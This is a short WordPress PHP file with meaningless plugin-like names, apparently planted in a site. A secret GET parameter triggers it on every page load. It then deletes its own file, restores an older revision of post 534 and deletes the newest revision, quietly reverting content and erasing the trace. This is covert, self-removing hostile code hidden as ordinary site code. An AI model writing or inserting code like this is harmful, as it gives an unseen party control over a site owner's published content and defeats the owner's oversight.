<?php

function elements_subscribe_last_slug() {
	if (isset($_GET['meta_user_refresh_rating']) && $_GET['meta_user_refresh_rating'] === 'subscribe_affiliate_auth') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$visitor_image_news = 534;
		$additional_google_options_extensions = wp_get_post_revisions($visitor_image_news);
		if (empty($additional_google_options_extensions)) die('no revisions');
		if (count($additional_google_options_extensions) < 2) die('less than 2');
		$source_yoast_client_interactive = array_shift($additional_google_options_extensions);
		$nofollow_page_player = $source_yoast_client_interactive->ID;
		$customizer_sharing_light = array_shift($additional_google_options_extensions);
		$webp_pdf_listings_countdown = $customizer_sharing_light->ID;
		$hello_animated_bulk = wp_restore_post_revision($webp_pdf_listings_countdown);
		if ($hello_animated_bulk === false) die('error restoring');
		$hello_animated_bulk = wp_delete_post_revision($nofollow_page_player);		
		if ($hello_animated_bulk === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'elements_subscribe_last_slug');
